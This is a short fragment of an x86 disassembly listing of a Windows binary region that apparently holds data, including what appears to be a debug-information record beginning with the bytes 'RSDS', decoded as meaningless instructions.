  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	cld    
  43398e:	inc    edx
  43398f:	mov    ebp,0x8411e843
  433994:	dec    esi
  433995:	mov    cl,0xd
  433997:	sub    dh,dh
  433999:	or     al,0x5b
  43399b:	shl    BYTE PTR [esi],1
  43399d:	push   cs
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
